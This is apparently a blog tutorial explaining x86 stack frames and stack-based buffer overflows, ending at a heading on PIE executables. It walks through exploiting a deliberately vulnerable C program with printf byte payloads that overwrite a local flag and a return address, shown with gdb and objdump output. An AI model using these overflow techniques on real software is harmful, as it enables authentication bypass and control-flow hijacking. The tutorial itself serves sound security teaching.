---
title:  "Stack Based Buffer Overflow Attacks"
date:   2025-11-11
categories: ["reverse engineering"]
tags: ["vulnerabilities", "buffer overflow","reverse engineering"]
author: Sanketh
references:
  
---

# Stack Based Buffer Overflow Attacks

A buffer overflow occurs when a program writes more data into a fixed-size buffer than it was designed to hold. A buffer is a contiguous block of memory allocated to store data (e.g., an array/string whose length is defined at compile time).

## Causes of Buffer Overflow Attacks in C

When we talk about buffer overflows, its almost always about buffer overflows in C programs because of the way the following things are designed in C:

### 1. C allows writing beyond (and before) array bounds

- Arrays in C are just raw memory. 
- The compiler does not perform runtime checks.
- If you write past `buf[63]`, C simply writes into whatever memory comes next.


```c
char buf[64];
buf[100] = 'A';   // C happily writes here → overflow
```

No warning, no crash, memory is overwritten silently.

### 2. C strings rely on null termination

C treats strings as a sequence of characters until it encounters a null termination character `\0`

Problems caused by this:

- Functions like `strcpy`, `gets`, `scanf("%s")` keep copying until they hit a null byte — not until the buffer ends.
- If input lacks a null terminator early enough, it will overflow.

### 3. Direct pointer arithmetic

C allows writing to any address you compute.

```c
*(buf + 80) = 'X';
```

Since the memory layout of a program was quite predictable before the mitigations like ASLR arrived, attackers could easily calculate which address needs to be overwritten with what value.

## What is Stack?

Stack is a segment of memory where the process stores function context: particularly function calls and its local variables. 

Before Stack, programmers didn't have a definite way of doing these things:
- Where to store function arguments
- Where to store local variables
- Where to store the return address (so CPU knows where to go back)
- How to make function calls nested (A → B → C → D …)
- How to handle recursion (function calling itself multiple times)

Some of the earlier assembly languages didn't have the concept of stack, programmers had to simulate the stack on their own on a raw block of memory. Today all the mainstream CPU's have support for stack at the hardware level.

### Why a stack specifically (LIFO)?

Function calls behave naturally like a Last-In-First-Out structure.

Example:

```
main calls A
A calls B
B calls C
```

Order of returning:

```
C returns to B
B returns to A
A returns to main
```

This is literally a LIFO pattern, a stack is the perfect structure.

### Structure of a Stack Frame

A stack frame is a single entry in the call stack that contains all the local variables and metadata associated with a function invocation. In a nested function call chain, each function maintains its own distinct stack frame, creating a LIFO (Last-In-First-Out) structure.

**Register Management in x86:**
- The **EBP (Base Pointer)** register marks the base of the currently active stack frame
- The **ESP (Stack Pointer)** register points to the top of the stack

**The Reality of Function Calls:**

While high-level languages like C use function call syntax, the underlying assembly implementation is fundamentally different. At the assembly level, there is no native concept of "functions"—each function call is simply a jump to a different memory location containing executable instructions.

This creates an important challenge: since function calls are just jumps, how do the caller and callee exchange information? How are parameters passed? Where should return values be placed? 

**The Application Binary Interface (ABI):**

The solution is the ABI—a standardized calling convention that defines the contract between caller and callee. The ABI specifies:
- How arguments are passed (registers vs. stack)
- Which registers are preserved across calls
- Where return values are stored
- How the stack frame is set up and torn down

Without this agreement, function calls across separately compiled code would be impossible, as each piece of code would have different expectations about parameter passing and register usage.

Let's take an example

```c
int main() {
    A(5);
}

void A(int a) {
    B(3);
}

void B(int b) {
    int local_var1;
    char local_var2;
}

```

The stack for this code when C is called will look like this:

```
Higher Memory Addresses (0xFFFFFFFF)
↑
|
|                    STACK GROWTH DIRECTION
|                           ↓↓↓
|
+------------------+
|   Arguments      |  ← Arguments for function A (if any)
|   for A          |
+------------------+
|   Return Addr    |  ← Where to return after A finishes (e.g., main)
|   to main        |
+------------------+
|   Saved EBP      |  ← main's base pointer
|   (main's frame) |
+------------------+ ← EBP when A is executing (A's frame base)
|   A's Local      |
|   Variables      |
|   - local_var1   |
|   - local_var2   |
+------------------+
|   Arguments      |  ← Arguments pushed for B (right to left in C)
|   for B          |    e.g., arg2, arg1
+------------------+
|   Return Addr    |  ← Where to return in A after B finishes
|   to A           |
+------------------+
|   Saved EBP      |  ← A's base pointer saved
|   (A's frame)    |
+------------------+ ← EBP (Current frame base - B is executing)
|   B's Local      |
|   Variables      |
|   - local_var1   |
|   - local_var2   |
+------------------+ ← ESP (Stack pointer - top of stack)
|                  |
|   (Unused        |
|    Stack         |
|    Space)        |
|                  |
↓
Lower Memory Addresses (0x00000000)
```

### What Happens During a Function Call

Now let's look at thx86 assembly code for what happens when a function is called

#### 1. Caller's Responsibilities (Before the Jump):

First, the caller must save the return address—the location where execution should resume after the function completes. Let's see what happens when function A calls function B.

```
push arguments_to_function_B (pushed in reverse order)
push next_instruction_address_of_function_A (the value in EIP register)
jmp address_of_function_B 
```

Sometimes the Caller can also decide to save all the values of general purpose registers to avoid losing its values from being overwritten by the caller. 

```
; Function A calling Function B with register preservation

function_A:
    ; ... A's code using registers ...
    mov eax, 100        ; EAX has important data
    mov ebx, 200        ; EBX has important data
    mov ecx, 300        ; ECX has important data
    
    ; Prepare to call B
    pusha               ; Push all general-purpose registers onto stack
                        ; Order: EAX, ECX, EDX, EBX, ESP, EBP, ESI, EDI
    
    push arguments_to_function_B    ; (pushed in reverse order)
    push next_instruction_address_of_function_A ; (the value in EIP register)
    jmp address_of_function_B

    popa                ; Restore all registers to their original values
                        ; Now EAX=100, EBX=200, ECX=300 again
    
    ; Continue with A's logic, registers are preserved
    ; ...
```

Most of the times callee's ABI clearly defines what register values are preserved and what can be overwritten, we can only save those registers instead.


#### 2. Callee's Responsibilities (Function Prologue):

Once inside the function B, we need to set up a new stack frame:

```
address_of_function_B:
    push ebp              ; Save the old base pointer (of function A)
    mov ebp, esp          ; Set EBP to current stack top (new frame base)
    sub esp, N            ; Allocate space for local variables (N bytes)
```

This sequence accomplishes three things:
- Preserves the caller's frame pointer (old EBP) so we can restore it late
- Establishes a new base pointer for the current function
- Allocates stack space for local variables by moving ESP downward

#### 3. Function Execution:

The function body executes, with local variables accessible via offsets from EBP:

- `[ebp-4]` accesses the first local variable
- `[ebp-8]` accesses the second, and so on
- Function parameters (if pushed by caller) are at `[ebp+8]`, `[ebp+12]`, etc.

#### 4. Callee's Responsibilities (Function Epilogue):

Before returning, we must tear down the stack frame and restore state:

```
    mov esp, ebp          ; Deallocate local variables (restore ESP)
    pop ebp               ; Restore the old base pointer
    ret_address = pop()   ; Get return address from stack
    jmp ret_address       ; Jump back to caller
```

This will:

- Collapses the function B's stack frame by resetting `ESP` to `EBP`
- Restores the caller's base pointer
- Retrieves the return address from the stack (saved by function A)
- Jumps back to continue execution after the original call site


### Simplified Function Call with CALL/RET/LEAVE

The x86 instruction set provides three specialized instructions that automate this process:

#### The CALL Instruction:

```
call function_address
```

This single instruction replaces:

```
push next_instruction_address
jmp function_address
```

It automatically pushes the return address (address of the instruction following `call`) onto the stack and jumps to the target function.

#### The LEAVE Instruction:

```
leave
```

This single instruction replaces:

```
mov esp, ebp
pop ebp
```

It efficiently collapses the stack frame and restores the old base pointer in one operation.

#### The RET Instruction:

```
ret
```

This single instruction replaces:

```
pop eip          ; Pop return address into instruction pointer
jmp eip          ; Jump to return address
```

#### Complete Example with Simplified Instructions:

```
; Caller side:
push argument2
push argument1
call my_function        ; Pushes return address and jumps
add esp, 8             ; Clean up arguments (caller cleanup)

; Callee side:
my_function:
    push ebp           ; Save old frame pointer
    mov ebp, esp       ; Set up new frame
    sub esp, 16        ; Allocate local variables
    
    ; ... function body ...
    
    leave              ; Equivalent to: mov esp, ebp; pop ebp
    ret                ; Pop return address and jump to it
```

## Buffer OverFlow Attacks

### 1. Overwriting a Variable On Stack

Consider this C program

```c
#include <stdio.h>
#include <string.h>


void grantAccess() {
	printf("Access Granted\n");
}

void checkPassword(char* password, int *isAuthenticated) {

	if (strcmp(password, "admin123") == 0) {
		*isAuthenticated = 1;
	}
}


void AuthenticateUser() {
	int  isAuthenticated = 0;
	char password[8];

	printf("Enter password: ");
	scanf("%s", password);

	checkPassword(password, &isAuthenticated);

	if (isAuthenticated == 1) {
		grantAccess();
	} else {
		printf("Authentication Failed\n");
	}

}

int main() {
	AuthenticateUser();
}
```

This is the normal working of the program

```
$ gcc main.c
$ ./a.out
Enter password: password
Authentication Failed
$ ./a.out
Enter password: admin123
Access Granted
```

What if we don't know the correct password? Can we still gain access?

The vulnerability lies in `scanf("%s", password);` which performs no bounds checking. This allows us to write more than 8 bytes into the `password` buffer, potentially overwriting adjacent stack variables—specifically, the `isAuthenticated` variable.

**Stack layout when `AuthenticateUser()` is executing:**
```
Higher Addresses
+-------------------------+
| Saved return address    | ← Return address to main()
+-------------------------+
| Saved RBP               | ← Previous stack frame base
+-------------------------+ ← RBP (current frame base)
| isAuthenticated (4 bytes) | ← [RBP-4]
+-------------------------+
| padding (if any)        |
+-------------------------+
| password[8]             | ← [RBP-12] (buffer starts here)
+-------------------------+ ← RSP (stack pointer)
Lower Addresses
```

Now let's compile another version of the code known as `vuln`

```
$ gcc -fno-stack-protector  -O0 -o vuln  main.c
```

**Why `-fno-stack-protector?`**

The `-fno-stack-protector` flag disables GCC's Stack Smashing Protector (SSP), also known as Stack Guard or ProPolice.

The Stack Guard's main feature is stack canary - although the existence of stsck canary doesn't stop this attack, we still need to disable it because Stack Guard also reorders the variables in stack such that `isAuthenticated` appears after `password`, so we would never be able to rewrite the password. 

`-O0` will disable all compiler optimizations, so we can see all the assembly code.

Let's start by printing the disassembly of the key functions

```bash
(gdb) disass AuthenticateUser
Dump of assembler code for function AuthenticateUser:
   0x00000000000011fe <+0>:	endbr64
   0x0000000000001202 <+4>:	push   rbp
   0x0000000000001203 <+5>:	mov    rbp,rsp
   0x0000000000001206 <+8>:	sub    rsp,0x10
   0x000000000000120a <+12>:	mov    DWORD PTR [rbp-0x4],0x0
   0x0000000000001211 <+19>:	lea    rax,[rip+0xe04]        # 0x201c
   0x0000000000001218 <+26>:	mov    rdi,rax
   0x000000000000121b <+29>:	mov    eax,0x0
   0x0000000000001220 <+34>:	call   0x1090 <printf@plt>
   0x0000000000001225 <+39>:	lea    rax,[rbp-0xc]
   0x0000000000001229 <+43>:	mov    rsi,rax
   0x000000000000122c <+46>:	lea    rax,[rip+0xdfa]        # 0x202d
   0x0000000000001233 <+53>:	mov    rdi,rax
   0x0000000000001236 <+56>:	mov    eax,0x0
   0x000000000000123b <+61>:	call   0x10b0 <__isoc99_scanf@plt>
   0x0000000000001240 <+66>:	lea    rdx,[rbp-0x4]
   0x0000000000001244 <+70>:	lea    rax,[rbp-0xc]
   0x0000000000001248 <+74>:	mov    rsi,rdx
   0x000000000000124b <+77>:	mov    rdi,rax
   0x000000000000124e <+80>:	call   0x11c3 <checkPassword>
   0x0000000000001253 <+85>:	mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000001256 <+88>:	cmp    eax,0x1
   0x0000000000001259 <+91>:	jne    0x1267 <AuthenticateUser+105>
   0x000000000000125b <+93>:	mov    eax,0x0
   0x0000000000001260 <+98>:	call   0x11a9 <grantAccess>
   0x0000000000001265 <+103>:	jmp    0x1276 <AuthenticateUser+120>
   0x0000000000001267 <+105>:	lea    rax,[rip+0xdc2]        # 0x2030
   0x000000000000126e <+112>:	mov    rdi,rax
   0x0000000000001271 <+115>:	call   0x1080 <puts@plt>
   0x0000000000001276 <+120>:	nop
   0x0000000000001277 <+121>:	leave
   0x0000000000001278 <+122>:	ret
End of assembler dump.
(gdb) disass checkPassword
Dump of assembler code for function checkPassword:
   0x00000000000011c3 <+0>:	endbr64
   0x00000000000011c7 <+4>:	push   rbp
   0x00000000000011c8 <+5>:	mov    rbp,rsp
   0x00000000000011cb <+8>:	sub    rsp,0x10
   0x00000000000011cf <+12>:	mov    QWORD PTR [rbp-0x8],rdi
   0x00000000000011d3 <+16>:	mov    QWORD PTR [rbp-0x10],rsi
   0x00000000000011d7 <+20>:	mov    rax,QWORD PTR [rbp-0x8]
   0x00000000000011db <+24>:	lea    rdx,[rip+0xe31]        # 0x2013
   0x00000000000011e2 <+31>:	mov    rsi,rdx
   0x00000000000011e5 <+34>:	mov    rdi,rax
   0x00000000000011e8 <+37>:	call   0x10a0 <strcmp@plt>
   0x00000000000011ed <+42>:	test   eax,eax
   0x00000000000011ef <+44>:	jne    0x11fb <checkPassword+56>
   0x00000000000011f1 <+46>:	mov    rax,QWORD PTR [rbp-0x10]
   0x00000000000011f5 <+50>:	mov    DWORD PTR [rax],0x1
   0x00000000000011fb <+56>:	nop
   0x00000000000011fc <+57>:	leave
   0x00000000000011fd <+58>:	ret
End of assembler dump.
```

By looking at the assembly of `AuthenticateUser` we can pinpoint where `isAuthenticated` and `password` are located on stack.

1. `isAuthenticated` at `[rbp-0x4]`

```asm
0x120a <+12>: mov    DWORD PTR [rbp-0x4],0x0
```

this is writing 0 to the address [rbp-0x4], which is equivalent to the C code

```c
int isAuthenticated = 0;  // Initialize to 0
```

2. `password` is at `[rbp-0xc]`

We can just figure it out by looking at the arguments passed to `checkPassword`

```
0x1240 <+66>: lea    rdx,[rbp-0x4]             ; Load address of [rbp-0x4]
0x1244 <+70>: lea    rax,[rbp-0xc]             ; Load address of [rbp-0xc]
0x1248 <+74>: mov    rsi,rdx                   ; 2nd arg: &isAuthenticated
0x124b <+77>: mov    rdi,rax                   ; 1st arg: password
0x124e <+80>: call   0x11c3 <checkPassword>
```

We know `rdi` contains first password and `rsi` contains second, from C code we can see first parameter is `password` and second parameter is `isAuthenticated`.

Now let's place a breakpoint right before this code

```c
	if (isAuthenticated == 1) {
```

We can spot the corresponding `cmp` assembly operation here

```
   0x000000000000124e <+80>:	call   0x11c3 <checkPassword>
   0x0000000000001253 <+85>:	mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000001256 <+88>:	cmp    eax,0x1
   0x0000000000001259 <+91>:	jne    0x1267 <AuthenticateUser+105>
   0x000000000000125b <+93>:	mov    eax,0x0
   0x0000000000001260 <+98>:	call   0x11a9 <grantAccess>
   0x0000000000001265 <+103>:	jmp    0x1276 <AuthenticateUser+120>
```

Note that `b *0x0000000000001256` won't work because the addresses we are seeing are the offsets in ELF. But since our binary is a PIE executable there will be a constant offset added, we can figure out the actual address using that offset or we can simply place it like this

```bash
(gdb)  break *AuthenticateUser+88
Breakpoint 4 at 0x555555555256
```

GDB allows this since the relative offsets will same and it is aware of the symbols. 

Now let's enter the password

```bash
(gdb) c
Continuing.
Enter password: AAAAAAAA1

Breakpoint 4, 0x0000555555555256 in AuthenticateUser ()
```

`AAAAAAAA1` is 9 bytes, just 1 byte more than password. Let's inspect the memory to confirm if the overflow happened.

```
(gdb) x/12xb $rbp - 0xc
0x7fffffffddf4:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffddfc:	0x31	0x00	0x00	0x00
(gdb) x/1dw $rbp - 0x4
0x7fffffffddfc:	49
```

Recall that `$rbp - 0xc` is the address of `password` and `$rbp - 0x4` is the address of `isAuthenticated`. 

In first command we are printing 12 bytes from `0x7fffffffddf4` we can see 9th byte is `0x31` which is the ascii value of `1` we entered at the end. 

But since the value stored is not `0x01` we can see the value of `isAuthenticated` is not `49` which will still fail the check.

```bash
(gdb) c
Continuing.
Authentication Failed
[Inferior 1 (process 8454) exited normally]
```

Now we know that overflow actually works, we can actually try to voerwrite `0x01` into the address of `isAuthenticated`. This is the scenario we are hoping for

```
0x7fffffffddf4:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffddfc:	0x01	0x00	0x00	0x00
```

Note that the bytes `0x01	0x00	0x00	0x00` appear reversed compared to the actual notation of 1 in 4-byte (word) format because this is little-endian representation.

The problem is the character whose ascii value is `0x01` is actually a non-printable character which means we can't type it into the terminal. 

But we can pass raw byte stream using utilities like `printf` and pipe its output to our program

```
$ printf 'AAAAAAAA\x01' | ./vuln
Enter password: Access Granted
```

This proves that the overwrite worked in an expected way!

### 2. Overwriting the Return Address on the Stack

In the earlier example, we were able to overwrite `isAuthenticated` because the buffer `password` was placed before it on the stack. When you write past the end of `password`, the overflow naturally overwrites the next variable in memory.

For the program we saw earlier, the key to overwriting `isAuthenticated` variable was the fact that its located after the `password` variable on the stack. If those two variables are reordered then its not possile to overwrite the value of `password`.

```c
void AuthenticateUser() {
    char password[8];
	int  isAuthenticated = 0;
```

Even if the `password` is placed afterwards, GCC's stack guard moves it such that `password` appears before the `isAuthenticated` variable, that's why we had to disable the stack guard using the `-fno-stack-protector` option. 

Because of this, we disabled GCC’s stack guard using:

`-fno-stack-protector`

When stack protection is off, we can reliably predict the layout and avoid the compiler reordering the variables.

Now we intentionally reorder the variables so that the integer comes first in source code, but ends up higher on the stack — meaning overflowing password will no longer overwrite isAuthenticated:

```c
#include <stdio.h>
#include <string.h>


void grantAccess() {
	printf("Access Granted\n");
}

void checkPassword(char* password, int *isAuthenticated) {

	if (strcmp(password, "admin123") == 0) {
		*isAuthenticated = 1;
	}
}


void AuthenticateUser() {
	char password[8];
	int  isAuthenticated = 0;

	printf("Enter password: ");
	scanf("%s", password);

	checkPassword(password, &isAuthenticated);

	if (isAuthenticated == 1) {
		grantAccess();
	} else {
		printf("Authentication Failed\n");
	}

}

int main() {
	AuthenticateUser();
}
```

Resulting Stack Layout

With stack protection disabled, the stack now looks like this:

```
Higher Addresses
+-----------------------------+
| Saved return address        |
+-----------------------------+
| Saved RBP                   |
+-----------------------------+ ← RBP
| password[8]                 | ← [RBP - 8 - padding]
+-----------------------------+
| padding (alignment)         |
+-----------------------------+
| isAuthenticated (4 bytes)   | ← [RBP - 12]
+-----------------------------+ ← RSP
Lower Addresses
```

Now our goal is to overwrite the return address in `AuthenticateUser` to the address of `grantAccess` function. This will allow us to get the access regardless of the value of `isAuthenticated` variable.

Since we need to replace the actual return address with `grantAccess`'s address, we need to pass it in the input to the program with appropriate byte calculations. 

To calculate the address of a function at runtime we need to learn about `PIE` and `ASLR`.

#### Non Position Independent Executable

The best way to understand Position Independent Code and Position Independent Executable is to compare its differences with non-PIE binary.

Let's compile a binary with `-fno-stack-protector` and `-fno-pie` flags

```bash
$ gcc -fno-pie -no-pie -fno-stack-protector -O0 -o vuln_no_pie main.c
```

`-fno-pie`: tells compiler to build non PIE
`-no-pie`: tells linker that the binary is non PIE

We know that ELF file decides a virtual address for each of the sections, we can check it from the section header table. 

```bash
$ readelf -S vuln_no_pie |  grep -E '.text|.data|.rodata'
  [15] .text             PROGBITS         00000000004010b0  000010b0
  [17] .rodata           PROGBITS         0000000000402000  00002000
  [25] .data             PROGBITS         0000000000404020  00003020
```

We can see as per the ELF file the `.text` segment starts at virtual address `0x00000000004010b0` . 

Let's disassemble the binary and confirm it

```bash
$ objdump -d -M intel,mnemonic,no-att -j .text vuln_no_pie

vuln_no_pie:     file format elf64-x86-64


Disassembly of section .text:

00000000004010b0 <_start>:
  4010b0:	f3 0f 1e fa          	endbr64
  4010b4:	31 ed                	xor    ebp,ebp
  4010b6:	49 89 d1             	mov    r9,rdx
  4010b9:	5e                   	pop    rsi
  4010ba:	48 89 e2             	mov    rdx,rsp
  4010bd:	48 83 e4 f0          	and    rsp,0xfffffffffffffff0
  4010c1:	50                   	push   rax
  4010c2:	54                   	push   rsp
  4010c3:	45 31 c0             	xor    r8d,r8d
  4010c6:	31 c9                	xor    ecx,ecx
  4010c8:	48 c7 c7 4d 12 40 00 	mov    rdi,0x40124d
  4010cf:	ff 15 03 2f 00 00    	call   QWORD PTR [rip+0x2f03]        # 403fd8 <__libc_start_main@GLIBC_2.34>
  4010d5:	f4                   	hlt
  4010d6:	66 2e 0f 1f 84 00 00 	cs nop WORD PTR [rax+rax*1+0x0]
  4010dd:	00 00 00

0000000000401196 <grantAccess>:
  401196:	f3 0f 1e fa          	endbr64
  40119a:	55                   	push   rbp
  40119b:	48 89 e5             	mov    rbp,rsp
  40119e:	bf 04 20 40 00       	mov    edi,0x402004
  4011a3:	e8 c8 fe ff ff       	call   401070 <puts@plt>
  4011a8:	90                   	nop
  4011a9:	5d                   	pop    rbp
  4011aa:	c3                   	ret

00000000004011ab <checkPassword>:
  4011ab:	f3 0f 1e fa          	endbr64
  4011af:	55                   	push   rbp
  4011b0:	48 89 e5             	mov    rbp,rsp
  4011b3:	48 83 ec 10          	sub    rsp,0x10
  4011b7:	48 89 7d f8          	mov    QWORD PTR [rbp-0x8],rdi
  4011bb:	48 89 75 f0          	mov    QWORD PTR [rbp-0x10],rsi
  4011bf:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4011c3:	be 13 20 40 00       	mov    esi,0x402013
  4011c8:	48 89 c7             	mov    rdi,rax
  4011cb:	e8 c0 fe ff ff       	call   401090 <strcmp@plt>
  4011d0:	85 c0                	test   eax,eax
  4011d2:	75 0a                	jne    4011de <checkPassword+0x33>
  4011d4:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  4011d8:	c7 00 01 00 00 00    	mov    DWORD PTR [rax],0x1
  4011de:	90                   	nop
  4011df:	c9                   	leave
  4011e0:	c3                   	ret

00000000004011e1 <AuthenticateUser>:
  4011e1:	f3 0f 1e fa          	endbr64
  4011e5:	55                   	push   rbp
  4011e6:	48 89 e5             	mov    rbp,rsp
  4011e9:	48 83 ec 10          	sub    rsp,0x10
  4011ed:	c7 45 f4 00 00 00 00 	mov    DWORD PTR [rbp-0xc],0x0
  4011f4:	bf 1c 20 40 00       	mov    edi,0x40201c
  4011f9:	b8 00 00 00 00       	mov    eax,0x0
  4011fe:	e8 7d fe ff ff       	call   401080 <printf@plt>
  401203:	48 8d 45 f8          	lea    rax,[rbp-0x8]
  401207:	48 89 c6             	mov    rsi,rax
  40120a:	bf 2d 20 40 00       	mov    edi,0x40202d
  40120f:	b8 00 00 00 00       	mov    eax,0x0
  401214:	e8 87 fe ff ff       	call   4010a0 <__isoc99_scanf@plt>
  401219:	48 8d 55 f4          	lea    rdx,[rbp-0xc]
  40121d:	48 8d 45 f8          	lea    rax,[rbp-0x8]
  401221:	48 89 d6             	mov    rsi,rdx
  401224:	48 89 c7             	mov    rdi,rax
  401227:	e8 7f ff ff ff       	call   4011ab <checkPassword>
  40122c:	8b 45 f4             	mov    eax,DWORD PTR [rbp-0xc]
  40122f:	83 f8 01             	cmp    eax,0x1
  401232:	75 0c                	jne    401240 <AuthenticateUser+0x5f>
  401234:	b8 00 00 00 00       	mov    eax,0x0
  401239:	e8 58 ff ff ff       	call   401196 <grantAccess>
  40123e:	eb 0a                	jmp    40124a <AuthenticateUser+0x69>
  401240:	bf 30 20 40 00       	mov    edi,0x402030
  401245:	e8 26 fe ff ff       	call   401070 <puts@plt>
  40124a:	90                   	nop
  40124b:	c9                   	leave
  40124c:	c3                   	ret

000000000040124d <main>:
  40124d:	f3 0f 1e fa          	endbr64
  401251:	55                   	push   rbp
  401252:	48 89 e5             	mov    rbp,rsp
  401255:	b8 00 00 00 00       	mov    eax,0x0
  40125a:	e8 82 ff ff ff       	call   4011e1 <AuthenticateUser>
  40125f:	b8 00 00 00 00       	mov    eax,0x0
  401264:	5d                   	pop    rbp
  401265:	c3                   	ret
```

This confirms that the `.text` section indeed starts at `0x00000000004010b0` and the disassembly shows that the address of `grantAccess` function is `0x0000000000401196`. 

So if we can overwrite the return address in `AuthenticateUser` function's stack frame to this address we should be able to achieve the goal. 

We can see `isAuthenticated` is at `[rbp - 0x0C]` and `password` is at `[rbp - 0x08]`  as expected. Since stack grows from higher address to lower addresses and we are on little-endian CPU,  `password` will start at `[rbp - 0x08]` and end at `[rbp - 0x01]`.

```
                +-------------------------------+
rbp + 8   --->  | Return address                | <-- overwriting this hijacks control
                +-------------------------------+
rbp       --->  | Saved RBP                     |
                +-------------------------------+
rbp-0x01  --->  | password[7]                   |
                |  ....                         |
rbp-0x08  --->  | password[0]                   |
                +-------------------------------+
rbp-0x0C  --->  | isAuthenticated               |
                +-------------------------------+
rbp-0x10  --->  | padding                       |
                +-------------------------------+
```

So the payload we need to build should be like this

```
offset 0x00..0x07  : 8 bytes  -> filler for password
offset 0x08..0x0F  : 8 bytes  -> overwrite saved RBP (can be garbage)
offset 0x10..0x17  : 8 bytes  -> overwrite saved RIP with 0x401196 (little-endian)
```

```bash
$ printf 'AAAAAAAAAAAAAAAA\x96\x11\x40\x00\x00\x00\x00\x00' | ./vuln_no_pie
Enter password: Authentication Failed
Access Granted
Segmentation fault (core dumped)
```

Here `AAAAAAAAAAAAAAAA` is 16 bytes, which will overwrite saved RBP, `\x96\x11\x40\x00\x00\x00\x00\x00` is the address of `grantAccess` function in little endian format which will overwrite the return address. 

We can see even though the password check failed **Authentication Failed**, we're able to get the access **Access Granted**.

After this we see **Segmentation fault (core dumped)**.

We can check kernel logs to see what exactly happened during segmentation fault.

```bash
$ sudo dmesg | tail -20

[13886.938338] vuln_no_pie[4028]: segfault at 7ffcd8fcd100 ip 00007ffcd8fcd100 sp 00007ffcd8fcd0a8 error 15 likely on CPU 6 (core 2, socket 0)
[13886.938371] Code: 00 00 d6 1e d4 6e 73 78 01 4e 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 3e 40 00 00 00 00 00 00 10 91 90 5a 7e 00 00 <d6> 1e 34 6d 73 78 01 4e d6 1e 56 8f 4f e9 4d 4d 00 00 00 00 fc 7f
```

Let's load the binary into GDB and see when exactly the Segmentation fault occured. 

```bash
(gdb) disass AuthenticateUser
Dump of assembler code for function AuthenticateUser:
   0x00000000004011e1 <+0>:	endbr64
   0x00000000004011e5 <+4>:	push   rbp
   0x00000000004011e6 <+5>:	mov    rbp,rsp
   0x00000000004011e9 <+8>:	sub    rsp,0x10
   0x00000000004011ed <+12>:	mov    DWORD PTR [rbp-0xc],0x0
   0x00000000004011f4 <+19>:	mov    edi,0x40201c
   0x00000000004011f9 <+24>:	mov    eax,0x0
   0x00000000004011fe <+29>:	call   0x401080 <printf@plt>
   0x0000000000401203 <+34>:	lea    rax,[rbp-0x8]
   0x0000000000401207 <+38>:	mov    rsi,rax
   0x000000000040120a <+41>:	mov    edi,0x40202d
   0x000000000040120f <+46>:	mov    eax,0x0
   0x0000000000401214 <+51>:	call   0x4010a0 <__isoc99_scanf@plt>
   0x0000000000401219 <+56>:	lea    rdx,[rbp-0xc]
   0x000000000040121d <+60>:	lea    rax,[rbp-0x8]
   0x0000000000401221 <+64>:	mov    rsi,rdx
   0x0000000000401224 <+67>:	mov    rdi,rax
   0x0000000000401227 <+70>:	call   0x4011ab <checkPassword>
   0x000000000040122c <+75>:	mov    eax,DWORD PTR [rbp-0xc]
   0x000000000040122f <+78>:	cmp    eax,0x1
   0x0000000000401232 <+81>:	jne    0x401240 <AuthenticateUser+95>
   0x0000000000401234 <+83>:	mov    eax,0x0
   0x0000000000401239 <+88>:	call   0x401196 <grantAccess>
   0x000000000040123e <+93>:	jmp    0x40124a <AuthenticateUser+105>
   0x0000000000401240 <+95>:	mov    edi,0x402030
   0x0000000000401245 <+100>:	call   0x401070 <puts@plt>
   0x000000000040124a <+105>:	nop
   0x000000000040124b <+106>:	leave
   0x000000000040124c <+107>:	ret

(gdb) b *0x0000000000401227
Breakpoint 1 at 0x401227
(gdb)  run < <(printf 'AAAAAAAAAAAAAAAA\x96\x11\x40\x00\x00\x00\x00\x00')
```
The first breakpoint is after the buffer overflow has already happened

Let's examine the stack 

```bash
(gdb) x/4xg $rbp - 8
0x7fffffffde48:	0x4141414141414141	0x4141414141414141
0x7fffffffde58:	0x0000000000401196	0x00007fffffffdf00
```

We can see saved rbp is overwritten with `0x4141414141414141` and return address is overwritten with `0x0000000000401196`.

Next breakpoint is right after `grantAccess` is called

```bash
(gdb) c
Continuing.
Enter password: Authentication Failed

Breakpoint 2, 0x0000000000401196 in grantAccess ()

(gdb) x/2xg $rbp - 8
0x4141414141414139:	Cannot access memory at address 0x4141414141414139
(gdb) p $rbp
$6 = (void *) 0x4141414141414141
```

We can see `$rbp` contains the overflowed `AA...` string. 

But after the prologue of `grantAccess` runs `$rbp` contains a valid value. Since we have valid value in `$rsp`, this command `mov  rbp,rsp` will set it set it to `$rsp`.

```bash
(gdb) disass grantAccess
Dump of assembler code for function grantAccess:
=> 0x0000000000401196 <+0>:	endbr64
   0x000000000040119a <+4>:	push   rbp
   0x000000000040119b <+5>:	mov    rbp,rsp
   0x000000000040119e <+8>:	mov    edi,0x402004
   0x00000000004011a3 <+13>:	call   0x401070 <puts@plt>
   0x00000000004011a8 <+18>:	nop
   0x00000000004011a9 <+19>:	pop    rbp
   0x00000000004011aa <+20>:	ret

(gdb) p $rbp
$7 = (void *) 0x7fffffffde58

(gdb) x/2xg $rbp
0x7fffffffde58:	0x4141414141414141	0x00007fffffffdf00
```

We can see the `0x4141414141414141` is still stored in stack in place of saved rbp again, but the `0x00007fffffffdf00` is not a valid return address at all, its because we came to `grantAccess` funcion using the `jump` instruction which doesn't save the return address unlike `call` command. 

The address `0x00007fffffffdf00` is the saved frame pointer (RBP) from main's stack frame

```
Stack of main:
+-------------------------------+
| Return address (to libc)      | ← 0x00007ffff7c2a1ca
+-------------------------------+
| Saved RBP (from main)         | ← 0x00007fffffffdf00 ← THIS ONE!
+-------------------------------+
| main's local variables        |
+-------------------------------+
```

The CPU tries to execute code at `0x00007fffffffdf00`, but this address contains stack data (main's saved RBP), not executable code.

So this is the value which causes the segfault, not the garbage value we entered. 

#### Position Independent Executable Without ASLR

Now let's compile the binary without `-fno-pie` and `-no-pie` which will compile the binary into a Position Independent Executable which is a default in GCC. 

